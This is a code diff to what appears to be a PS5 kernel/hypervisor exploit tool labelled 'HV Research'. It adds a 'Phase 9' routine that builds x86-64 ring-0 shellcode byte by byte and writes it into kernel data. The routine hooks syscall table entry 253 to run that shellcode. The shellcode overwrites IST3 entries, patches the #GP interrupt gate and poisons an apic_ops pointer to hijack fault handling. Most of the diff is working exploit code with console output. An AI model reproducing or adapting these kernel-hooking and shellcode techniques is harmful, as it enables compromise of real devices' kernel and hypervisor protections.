@@ -195,6 +195,10 @@ static void    *g_msg_vaddr = NULL;
 static uint64_t g_apic_ops_addr = 0;   /* KVA of apic_ops table */
 static int      g_apic_ops_count = 0;  /* Number of entries (typically 28) */
 
+/* Sysent discovery (set by campaign_kernel_recon, used by Phase 9 ring-0 arm) */
+static uint64_t g_sysent_kva = 0;     /* KVA of sysent table */
+static int      g_sysent_verified = 0; /* 1 = sysent verified via narg checks */
+
 /* Kmod trampoline addresses (set by kmod campaign, used by Phase 7) */
 static uint64_t g_kmod_trampoline_func = 0;    /* KVA of trampoline_xapic_mode() in kmod .text */
 static uint64_t g_kmod_trampoline_target = 0;  /* KVA of g_trampoline_target in kmod .data */
@@ -3047,9 +3051,12 @@ ring3_fallback:
             /* 12/12 narg match is strong proof. PS5 has ~117 custom Sony
              * syscalls in 600-723, so nosys count is just informational. */
             sysent_verified = (narg_ok == narg_total && narg_total >= 10);
-            if (sysent_verified)
+            if (sysent_verified) {
                 printf("[+] Sysent table VERIFIED (12/12 narg match)!\n");
-            else
+                /* Export to globals for Phase 9 ring-0 arm+trigger */
+                g_sysent_kva = sysent_kva;
+                g_sysent_verified = 1;
+            } else
                 printf("[-] Sysent verification failed (%d/%d narg).\n",
                        narg_ok, narg_total);
             fflush(stdout);
@@ -4896,6 +4903,237 @@ struct gadget_pattern {
     int useful;     /* 1 = immediately useful, 0 = informational */
 };
 
+/* ── Ring-0 arm+trigger for Phase 9 ──
+ *
+ * Builds a ring-0 shellcode that arms the #GP mechanism (IST3, IDT[13],
+ * poisoned apic_ops[2]) AND immediately triggers it on the current CPU
+ * via `call rax` with the poisoned value.  The handler catches the #GP,
+ * restores everything, and the syscall returns normally.
+ *
+ * This avoids the TLB stale-NX problem: idle CPUs in FreeBSD's hlt loop
+ * never context-switch, so their TLB retains NX=1 for the cave PDE even
+ * after we cleared it.  The countdown-based approach arms the poison and
+ * hopes the first xapic_mode() call happens on a CPU with clean TLB —
+ * if it doesn't (idle CPU), the handler instruction fetch faults and the
+ * kernel triple-faults.
+ *
+ * By triggering on the current CPU (which did a context switch during
+ * sleep(3) → CR3 reload → TLB flushed), we guarantee success.
+ *
+ * Returns 1 on success, 0 on failure (falls back to countdown approach).
+ */
+static int phase9_ring0_arm_trigger(
+    uint64_t cave_kva,       /* cave base KVA (for invlpg) */
+    uint64_t new_ist3,       /* IST3 value to set (cave_kva + 0x100) */
+    uint64_t tss_pa,         /* PA of CPU 0's TSS */
+    uint8_t *new_idt13,      /* 16-byte IDT[13] gate descriptor */
+    uint64_t idt13_dmap_addr,/* DMAP addr of IDT[13] in IDT table */
+    uint64_t poisoned,       /* poisoned apic_ops[2] value (0xDEB7 prefix) */
+    uint64_t apic_ops2_dmap, /* DMAP addr of apic_ops[2] */
+    uint64_t original_xapic) /* original valid xapic_mode pointer */
+{
+    #define SYSENT_STRIDE_P9 0x30
+    #define TSS_STRIDE_P9    0x68
+    #define NUM_CPUS_P9      16
+
+    if (!g_sysent_verified || !g_sysent_kva) {
+        printf("[*] Ring-0 arm+trigger: sysent not available, skipping.\n");
+        return 0;
+    }
+
+    uint64_t target_pa = va_to_pa_quiet(g_kdata_base);
+    if (!target_pa) {
+        printf("[-] Ring-0 arm+trigger: kdata_base VA→PA failed.\n");
+        return 0;
+    }
+
+    printf("\n[*] Phase 9: Ring-0 arm+trigger (preferred method)\n");
+    printf("[*] Arms IST3+IDT+poison AND triggers #GP on current CPU.\n");
+    printf("[*] Current CPU has clean TLB (from sleep context switch).\n");
+    fflush(stdout);
+
+    /* Build the arm+trigger shellcode.
+     *
+     * Layout (runs in ring 0):
+     *   invlpg [cave_kva]              — flush 2MB TLB entry
+     *   loop: set IST3 on all 16 CPUs  — DMAP writes
+     *   write new IDT[13]              — DMAP write (16 bytes)
+     *   write poisoned apic_ops[2]     — DMAP write
+     *   call rax (= poisoned)          — triggers #GP → handler → restore
+     *   xor eax, eax; ret              — return success
+     */
+    uint8_t sc[256];
+    int p = 0;
+
+    /* 1. invlpg [rax] — flush TLB for cave's 2MB page on current CPU */
+    /* movabs rax, cave_kva */
+    sc[p++] = 0x48; sc[p++] = 0xB8;
+    memcpy(&sc[p], &cave_kva, 8); p += 8;
+    /* invlpg [rax] = 0F 01 38 */
+    sc[p++] = 0x0F; sc[p++] = 0x01; sc[p++] = 0x38;
+
+    /* 2. Set IST3 on all 16 CPUs (loop: mov [rdi], rax; add rdi, stride) */
+    /* movabs rax, new_ist3 */
+    sc[p++] = 0x48; sc[p++] = 0xB8;
+    memcpy(&sc[p], &new_ist3, 8); p += 8;
+    /* movabs rdi, <DMAP addr of CPU 0's IST3> */
+    uint64_t ist3_cpu0_dmap = g_dmap_base + tss_pa + 0x34;
+    sc[p++] = 0x48; sc[p++] = 0xBF;
+    memcpy(&sc[p], &ist3_cpu0_dmap, 8); p += 8;
+    /* mov ecx, NUM_CPUS */
+    sc[p++] = 0xB9;
+    sc[p++] = NUM_CPUS_P9; sc[p++] = 0x00; sc[p++] = 0x00; sc[p++] = 0x00;
+    /* loop body (11 bytes): */
+    /* mov [rdi], rax */
+    sc[p++] = 0x48; sc[p++] = 0x89; sc[p++] = 0x07;
+    /* add rdi, 0x68 (TSS stride) */
+    sc[p++] = 0x48; sc[p++] = 0x83; sc[p++] = 0xC7; sc[p++] = TSS_STRIDE_P9;
+    /* dec ecx */
+    sc[p++] = 0xFF; sc[p++] = 0xC9;
+    /* jnz loop_top — loop body is 11 bytes, so offset = -11 = 0xF5 */
+    sc[p++] = 0x75;
+    sc[p++] = 0xF5;  /* relative backward jump: -(3+4+2+2) = -11 */
+
+    /* 3. Patch IDT[13] — write 16 bytes via two 8-byte DMAP writes */
+    uint64_t idt13_low, idt13_high;
+    memcpy(&idt13_low,  &new_idt13[0], 8);
+    memcpy(&idt13_high, &new_idt13[8], 8);
+    /* movabs rax, idt13_low */
+    sc[p++] = 0x48; sc[p++] = 0xB8;
+    memcpy(&sc[p], &idt13_low, 8); p += 8;
+    /* movabs rdi, idt13_dmap_addr */
+    sc[p++] = 0x48; sc[p++] = 0xBF;
+    memcpy(&sc[p], &idt13_dmap_addr, 8); p += 8;
+    /* mov [rdi], rax */
+    sc[p++] = 0x48; sc[p++] = 0x89; sc[p++] = 0x07;
+    /* movabs rax, idt13_high */
+    sc[p++] = 0x48; sc[p++] = 0xB8;
+    memcpy(&sc[p], &idt13_high, 8); p += 8;
+    /* mov [rdi+8], rax */
+    sc[p++] = 0x48; sc[p++] = 0x89; sc[p++] = 0x47; sc[p++] = 0x08;
+
+    /* 4. Poison apic_ops[2] */
+    /* movabs rax, poisoned */
+    sc[p++] = 0x48; sc[p++] = 0xB8;
+    memcpy(&sc[p], &poisoned, 8); p += 8;
+    /* movabs rdi, apic_ops2_dmap */
+    sc[p++] = 0x48; sc[p++] = 0xBF;
+    memcpy(&sc[p], &apic_ops2_dmap, 8); p += 8;
+    /* mov [rdi], rax */
+    sc[p++] = 0x48; sc[p++] = 0x89; sc[p++] = 0x07;
+
+    /* 5. Trigger: call rax (poisoned non-canonical → #GP)
+     *
+     * rax still holds the poisoned value from the movabs above.
+     * 'call rax' with non-canonical target → #GP(0).
+     * Handler fires on THIS CPU (clean TLB), restores everything,
+     * puts valid xapic_mode in rax, iretq re-executes 'call rax'.
+     * xapic_mode() runs normally and returns here.
+     *
+     * Note: AMD64 checks canonical BEFORE pushing return address,
+     * so RSP is unmodified when #GP fires.  After handler's iretq,
+     * the re-executed 'call rax' pushes the return address correctly. */
+    /* call rax = FF D0 */
+    sc[p++] = 0xFF; sc[p++] = 0xD0;
+
+    /* 6. If we reach here, xapic_mode() returned normally — success! */
+    /* xor eax, eax */
+    sc[p++] = 0x31; sc[p++] = 0xC0;
+    /* ret */
+    sc[p++] = 0xC3;
+
+    printf("[+] Built %d-byte arm+trigger shellcode\n", p);
+    printf("    cave_kva       = 0x%lx\n", (unsigned long)cave_kva);
+    printf("    ist3_cpu0_dmap = 0x%lx\n", (unsigned long)ist3_cpu0_dmap);
+    printf("    idt13_dmap     = 0x%lx\n", (unsigned long)idt13_dmap_addr);
+    printf("    ops2_dmap      = 0x%lx\n", (unsigned long)apic_ops2_dmap);
+    printf("    poisoned       = 0x%016lx\n", (unsigned long)poisoned);
+    printf("    original_xapic = 0x%016lx\n", (unsigned long)original_xapic);
+    printf("    Bytes: ");
+    for (int i = 0; i < p; i++) printf("%02x ", sc[i]);
+    printf("\n");
+    fflush(stdout);
+
+    /* Save original kdata_base content, write shellcode */
+    uint8_t backup[256];
+    kernel_copyout(g_dmap_base + target_pa, backup, p);
+    kernel_copyin(sc, g_dmap_base + target_pa, p);
+
+    /* Verify shellcode write */
+    uint8_t verify[256];
+    kernel_copyout(g_dmap_base + target_pa, verify, p);
+    if (memcmp(sc, verify, p)) {
+        printf("[-] Shellcode write verification FAILED.\n");
+        kernel_copyin(backup, g_dmap_base + target_pa, p);
+        return 0;
+    }
+    printf("[+] Shellcode written to kdata_base, verified OK\n");
+
+    /* Hook sysent[253] → kdata_base */
+    uint64_t s253_kva = g_sysent_kva + 253ULL * SYSENT_STRIDE_P9;
+    uint64_t s253_pa  = va_to_pa_quiet(s253_kva);
+    if (!s253_pa) {
+        printf("[-] sysent[253] VA→PA failed.\n");
+        kernel_copyin(backup, g_dmap_base + target_pa, p);
+        return 0;
+    }
+    uint8_t s253_orig[SYSENT_STRIDE_P9];
+    kernel_copyout(g_dmap_base + s253_pa, s253_orig, SYSENT_STRIDE_P9);
+
+    uint64_t s253_call_pa = va_to_pa_quiet(s253_kva + 8);
+    kernel_copyin(&g_kdata_base, g_dmap_base + s253_call_pa, 8);
+
+    int32_t narg_zero = 0;
+    uint64_t s253_narg_pa = va_to_pa_quiet(s253_kva);
+    kernel_copyin(&narg_zero, g_dmap_base + s253_narg_pa, 4);
+
+    printf("[*] sysent[253] hooked → kdata_base (0x%lx)\n",
+           (unsigned long)g_kdata_base);
+    printf("[*] Calling syscall(253) — arm+trigger in ring 0...\n");
+    fflush(stdout);
+
+    errno = 0;
+    long ret = syscall(253);
+    int err = errno;
+
+    printf("[+] syscall(253) returned: %ld, errno=%d\n", ret, err);
+
+    /* Restore sysent[253] and kdata_base content */
+    kernel_copyin(s253_orig, g_dmap_base + s253_pa, SYSENT_STRIDE_P9);
+    kernel_copyin(backup, g_dmap_base + target_pa, p);
+
+    if (ret == 0 && err == 0) {
+        printf("[+] ============================================\n");
+        printf("[+]  PHASE 9 — ARM+TRIGGER SUCCESS!\n");
+        printf("[+] ============================================\n");
+        printf("[+]\n");
+        printf("[+]  #GP fired and was caught by handler on current CPU.\n");
+        printf("[+]  IDT[13], IST3, and apic_ops[2] all restored.\n");
+        printf("[+]  System is stable — enter rest mode at your leisure.\n");
+        printf("[+]\n");
+        printf("[+]  The flatz pointer-poisoning mechanism is PROVEN.\n");
+
+        /* Verify apic_ops[2] was actually restored */
+        uint64_t ops2_now;
+        kernel_copyout(apic_ops2_dmap, &ops2_now, 8);
+        if (ops2_now == original_xapic) {
+            printf("[+]  apic_ops[2] verified: 0x%016lx (restored)\n",
+                   (unsigned long)ops2_now);
+        } else {
+            printf("[!]  apic_ops[2] = 0x%016lx (expected 0x%016lx)\n",
+                   (unsigned long)ops2_now, (unsigned long)original_xapic);
+        }
+
+        notify("[HV Research] Phase 9: arm+trigger SUCCESS! Enter rest mode when ready.");
+        return 1;
+    } else {
+        printf("[-] syscall(253) returned error (ret=%ld errno=%d).\n",
+               ret, err);
+        printf("[-] Falling back to countdown-based arming.\n");
+        return 0;
+    }
+}
+
 static void campaign_flatz_setup(void) {
     printf("\n=============================================\n");
     printf("  Phase 6: Flatz Suspend/Resume Setup\n");
@@ -6466,15 +6704,24 @@ static void campaign_flatz_setup(void) {
             uint64_t poisoned = (original_xapic & 0x0000FFFFFFFFFFFFULL) |
                                 (0xDEB7ULL << 48);
 
-            /* ── Deferred arming countdown ──
+            /* ── Preferred: Ring-0 arm+trigger ──
+             * Arms and triggers #GP on current CPU (clean TLB guaranteed).
+             * Falls back to countdown if sysent unavailable. */
+            if (phase9_ring0_arm_trigger(cave_kva, new_ist3,
+                    tss_pa, new_idt13, idt13_dmap_addr, poisoned,
+                    apic_ops2_dmap, original_xapic)) {
+                phase9_armed = 1;
+                goto phase9_kld_done;
+            }
+
+            /* ── Fallback: Deferred arming countdown ──
              *
-             * DO NOT arm immediately!  Pressing the PS button to exit
-             * the plugin menu triggers APIC interrupt handling, which
-             * calls xapic_mode().  If we poison apic_ops[2] now, the
-             * #GP fires before the user reaches rest mode → panic.
+             * WARNING: This path is unreliable!  Idle CPUs may have stale
+             * NX=1 TLB entries for the handler page.  If the first
+             * xapic_mode() call after arming fires on an idle CPU, the
+             * handler instruction fetch faults → triple fault → panic.
              *
-             * Instead: give the user 25 seconds to navigate to
-             *   Settings → System → Power Saving → Enter Rest Mode
+             * Give the user 25 seconds to navigate to rest mode,
              * THEN arm IDT[13] + IST3 + poison in tight sequence. */
 
             printf("\n");
@@ -6571,6 +6818,7 @@ static void campaign_flatz_setup(void) {
             printf("[+]  armed once the countdown finishes.  Enter rest mode.\n");
 
             notify("[HV Research] ARMED! Enter rest mode NOW!");
+phase9_kld_done: ;
         } else if (cave_npt_executable) {
             /* ── ARM using inline handler in NPT-executable cave ──
              *
@@ -6619,18 +6867,27 @@ static void campaign_flatz_setup(void) {
             /* Save original IST3 in cave for post-resume diagnostics */
             kernel_copyin(&orig_ist3, cave_dmap + 0x130, 8);
 
-            /* ── Deferred arming countdown ──
+            /* ── Preferred: Ring-0 arm+trigger ──
+             * Arms and triggers #GP on current CPU (clean TLB guaranteed).
+             * Falls back to countdown if sysent unavailable. */
+            if (phase9_ring0_arm_trigger(cave_kva, new_ist3,
+                    tss_pa, new_idt13, idt13_dmap_addr, poisoned,
+                    apic_ops2_dmap, original_xapic)) {
+                phase9_armed = 1;
+                goto phase9_cave_done;
+            }
+
+            /* ── Fallback: Deferred arming countdown ──
              *
-             * DO NOT arm immediately!  Pressing the PS button to exit
-             * the plugin menu triggers APIC interrupt handling, which
-             * calls xapic_mode().  If we poison apic_ops[2] now, the
-             * #GP fires before the user reaches rest mode → panic.
+             * WARNING: This path is unreliable!  Idle CPUs may have stale
+             * NX=1 TLB entries for the handler page.  If the first
+             * xapic_mode() call after arming fires on an idle CPU, the
+             * handler instruction fetch faults → triple fault → panic.
              *
-             * Instead: give the user 25 seconds to navigate to
-             *   Settings → System → Power Saving → Enter Rest Mode
+             * Give the user 25 seconds to navigate to rest mode,
              * THEN arm IDT[13] + IST3 + poison in tight sequence.
-             * The 25-second delay also ensures all CPU TLBs have
-             * flushed the stale NX entry for the cave page. */
+             * The 25-second delay MAY help flush TLBs via context switches
+             * but is NOT reliable for idle CPUs in hlt loops. */
 
             printf("\n");
             printf("[!] =====================================================\n");
@@ -6717,6 +6974,7 @@ static void campaign_flatz_setup(void) {
             printf("[+]  armed once the countdown finishes.  Enter rest mode.\n");
 
             notify("[HV Research] ARMED! Enter rest mode NOW!");
+phase9_cave_done: ;
         }
 
 phase9_not_armed:
